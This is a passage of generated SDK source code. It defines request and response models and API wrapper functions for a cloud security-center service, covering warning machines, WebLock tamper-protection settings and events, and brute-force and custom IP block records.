  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  link?: string(name='Link'),
  message?: string(name='Message'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWarningExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningExportInfoResponseBody(name='body'),
}

async function describeWarningExportInfoWithOptions(request: DescribeWarningExportInfoRequest, runtime: Util.RuntimeOptions): DescribeWarningExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningExportInfo(request: DescribeWarningExportInfoRequest): DescribeWarningExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningExportInfoWithOptions(request, runtime);
}

model DescribeWarningMachinesRequest {
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: int32(name='CurrentPage'),
  groupId?: long(name='GroupId'),
  haveRisk?: int32(name='HaveRisk'),
  lang?: string(name='Lang'),
  machineName?: string(name='MachineName'),
  pageSize?: int32(name='PageSize'),
  riskId?: long(name='RiskId'),
  sourceIp?: string(name='SourceIp'),
  strategyId?: long(name='StrategyId'),
  targetType?: string(name='TargetType'),
  uuids?: string(name='Uuids'),
}

model DescribeWarningMachinesResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  warningMachines?: [ 
    {
      authVersion?: int32(name='AuthVersion'),
      bind?: boolean(name='Bind'),
      highWarningCount?: int32(name='HighWarningCount'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lowWarningCount?: int32(name='LowWarningCount'),
      mediumWarningCount?: int32(name='MediumWarningCount'),
      passCount?: int32(name='PassCount'),
      portOpen?: boolean(name='PortOpen'),
      regionId?: string(name='RegionId'),
      status?: int32(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='WarningMachines'),
}

model DescribeWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWarningMachinesResponseBody(name='body'),
}

async function describeWarningMachinesWithOptions(request: DescribeWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.haveRisk)) {
    query['HaveRisk'] = request.haveRisk;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWarningMachines(request: DescribeWarningMachinesRequest): DescribeWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningMachinesWithOptions(request, runtime);
}

model DescribeWebLockBindListRequest {
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
}

model DescribeWebLockBindListResponseBody = {
  bindList?: [ 
    {
      auditCount?: string(name='AuditCount'),
      blockCount?: string(name='BlockCount'),
      dirCount?: string(name='DirCount'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      os?: string(name='Os'),
      percent?: int32(name='Percent'),
      serviceCode?: string(name='ServiceCode'),
      serviceDetail?: string(name='ServiceDetail'),
      serviceStatus?: string(name='ServiceStatus'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='BindList'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockBindListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockBindListResponseBody(name='body'),
}

async function describeWebLockBindListWithOptions(request: DescribeWebLockBindListRequest, runtime: Util.RuntimeOptions): DescribeWebLockBindListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockBindList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockBindList(request: DescribeWebLockBindListRequest): DescribeWebLockBindListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockBindListWithOptions(request, runtime);
}

model DescribeWebLockConfigListRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  uuid?: string(name='Uuid'),
}

model DescribeWebLockConfigListResponseBody = {
  configList?: [ 
    {
      defenceMode?: string(name='DefenceMode'),
      dir?: string(name='Dir'),
      exclusiveDir?: string(name='ExclusiveDir'),
      exclusiveFile?: string(name='ExclusiveFile'),
      exclusiveFileType?: string(name='ExclusiveFileType'),
      id?: string(name='Id'),
      inclusiveFile?: string(name='InclusiveFile'),
      inclusiveFileType?: string(name='InclusiveFileType'),
      localBackupDir?: string(name='LocalBackupDir'),
      mode?: string(name='Mode'),
      uuid?: string(name='Uuid'),
    }
  ](name='ConfigList'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockConfigListResponseBody(name='body'),
}

async function describeWebLockConfigListWithOptions(request: DescribeWebLockConfigListRequest, runtime: Util.RuntimeOptions): DescribeWebLockConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockConfigList(request: DescribeWebLockConfigListRequest): DescribeWebLockConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockConfigListWithOptions(request, runtime);
}

model DescribeWebLockExclusiveFileTypeResponseBody = {
  exclusiveFileType?: [ string ](name='ExclusiveFileType'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockExclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockExclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockExclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockExclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockExclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockExclusiveFileType(): DescribeWebLockExclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockExclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockFileChangeStatisticsRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model DescribeWebLockFileChangeStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: int32(name='Count'),
      file?: string(name='File'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockFileChangeStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileChangeStatisticsResponseBody(name='body'),
}

async function describeWebLockFileChangeStatisticsWithOptions(request: DescribeWebLockFileChangeStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileChangeStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileChangeStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileChangeStatistics(request: DescribeWebLockFileChangeStatisticsRequest): DescribeWebLockFileChangeStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileChangeStatisticsWithOptions(request, runtime);
}

model DescribeWebLockFileEventsRequest {
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  pageSize?: int32(name='PageSize'),
  processName?: string(name='ProcessName'),
  remark?: string(name='Remark'),
  tsBegin?: long(name='TsBegin'),
  tsEnd?: long(name='TsEnd'),
}

model DescribeWebLockFileEventsResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: long(name='Count'),
      ds?: long(name='Ds'),
      eventName?: string(name='EventName'),
      eventStatus?: string(name='EventStatus'),
      eventType?: string(name='EventType'),
      gmtEvent?: long(name='GmtEvent'),
      id?: long(name='Id'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      level?: string(name='Level'),
      path?: string(name='Path'),
      processName?: string(name='ProcessName'),
      processPath?: string(name='ProcessPath'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileEventsResponseBody(name='body'),
}

async function describeWebLockFileEventsWithOptions(request: DescribeWebLockFileEventsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.tsBegin)) {
    query['TsBegin'] = request.tsBegin;
  }
  if (!Util.isUnset(request.tsEnd)) {
    query['TsEnd'] = request.tsEnd;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileEvents(request: DescribeWebLockFileEventsRequest): DescribeWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileEventsWithOptions(request, runtime);
}

model DescribeWebLockFileTypeSummaryResponseBody = {
  list?: [ 
    {
      count?: int32(name='Count'),
      type?: string(name='Type'),
    }
  ](name='List'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockFileTypeSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockFileTypeSummaryResponseBody(name='body'),
}

async function describeWebLockFileTypeSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockFileTypeSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileTypeSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockFileTypeSummary(): DescribeWebLockFileTypeSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileTypeSummaryWithOptions(runtime);
}

model DescribeWebLockInclusiveFileTypeResponseBody = {
  inclusiveFileType?: [ string ](name='InclusiveFileType'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockInclusiveFileTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockInclusiveFileTypeResponseBody(name='body'),
}

async function describeWebLockInclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockInclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockInclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockInclusiveFileType(): DescribeWebLockInclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockInclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockProcessBlockStatisticsRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
}

model DescribeWebLockProcessBlockStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: int32(name='Count'),
      process?: string(name='Process'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockProcessBlockStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessBlockStatisticsResponseBody(name='body'),
}

async function describeWebLockProcessBlockStatisticsWithOptions(request: DescribeWebLockProcessBlockStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessBlockStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessBlockStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessBlockStatistics(request: DescribeWebLockProcessBlockStatisticsRequest): DescribeWebLockProcessBlockStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessBlockStatisticsWithOptions(request, runtime);
}

model DescribeWebLockProcessListRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  processName?: string(name='ProcessName'),
  status?: int32(name='Status'),
}

model DescribeWebLockProcessListResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  list?: [ 
    {
      count?: string(name='Count'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      processName?: string(name='ProcessName'),
      processPath?: string(name='ProcessPath'),
      status?: int32(name='Status'),
      uuid?: string(name='Uuid'),
    }
  ](name='List'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebLockProcessListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockProcessListResponseBody(name='body'),
}

async function describeWebLockProcessListWithOptions(request: DescribeWebLockProcessListRequest, runtime: Util.RuntimeOptions): DescribeWebLockProcessListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.processName)) {
    query['ProcessName'] = request.processName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockProcessList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockProcessList(request: DescribeWebLockProcessListRequest): DescribeWebLockProcessListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockProcessListWithOptions(request, runtime);
}

model DescribeWebLockStatusRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeWebLockStatusResponseBody = {
  authCount?: int32(name='AuthCount'),
  bindCount?: int32(name='BindCount'),
  blockCount?: int32(name='BlockCount'),
  dirCount?: int32(name='DirCount'),
  expireTime?: long(name='ExpireTime'),
  requestId?: string(name='RequestId'),
  whiteCount?: int32(name='WhiteCount'),
}

model DescribeWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockStatusResponseBody(name='body'),
}

async function describeWebLockStatusWithOptions(request: DescribeWebLockStatusRequest, runtime: Util.RuntimeOptions): DescribeWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockStatus(request: DescribeWebLockStatusRequest): DescribeWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockStatusWithOptions(request, runtime);
}

model DescribeWebLockTotalFileChangeCountResponseBody = {
  requestId?: string(name='RequestId'),
  totalCount?: long(name='TotalCount'),
}

model DescribeWebLockTotalFileChangeCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebLockTotalFileChangeCountResponseBody(name='body'),
}

async function describeWebLockTotalFileChangeCountWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockTotalFileChangeCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockTotalFileChangeCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebLockTotalFileChangeCount(): DescribeWebLockTotalFileChangeCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockTotalFileChangeCountWithOptions(runtime);
}

model DescribeWebPathRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  type?: string(name='Type'),
}

model DescribeWebPathResponseBody = {
  configList?: [ 
    {
      targetList?: [ 
        {
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='TargetList'),
      webPath?: string(name='WebPath'),
      webPathType?: string(name='WebPathType'),
    }
  ](name='ConfigList'),
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeWebPathResponseBody(name='body'),
}

async function describeWebPathWithOptions(request: DescribeWebPathRequest, runtime: Util.RuntimeOptions): DescribeWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeWebPath(request: DescribeWebPathRequest): DescribeWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebPathWithOptions(request, runtime);
}

model DisableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  id?: long(name='Id'),
  port?: string(name='Port'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid'),
}

model DisableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model DisableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableBruteForceRecordResponseBody(name='body'),
}

async function disableBruteForceRecordWithOptions(request: DisableBruteForceRecordRequest, runtime: Util.RuntimeOptions): DisableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableBruteForceRecord(request: DisableBruteForceRecordRequest): DisableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableBruteForceRecordWithOptions(request, runtime);
}

model DisableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DisableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model DisableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DisableCustomBlockRecordResponseBody(name='body'),
}

async function disableCustomBlockRecordWithOptions(request: DisableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DisableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DisableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function disableCustomBlockRecord(request: DisableCustomBlockRecordRequest): DisableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return disableCustomBlockRecordWithOptions(request, runtime);
}

model EnableBruteForceRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  id?: long(name='Id'),
  port?: string(name='Port'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuid?: string(name='Uuid'),
}

model EnableBruteForceRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model EnableBruteForceRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableBruteForceRecordResponseBody(name='body'),
}

async function enableBruteForceRecordWithOptions(request: EnableBruteForceRecordRequest, runtime: Util.RuntimeOptions): EnableBruteForceRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableBruteForceRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableBruteForceRecord(request: EnableBruteForceRecordRequest): EnableBruteForceRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableBruteForceRecordWithOptions(request, runtime);
}

model EnableCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp'),
  bound?: string(name='Bound'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model EnableCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId'),
}

model EnableCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: EnableCustomBlockRecordResponseBody(name='body'),
}

async function enableCustomBlockRecordWithOptions(request: EnableCustomBlockRecordRequest, runtime: Util.RuntimeOptions): EnableCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
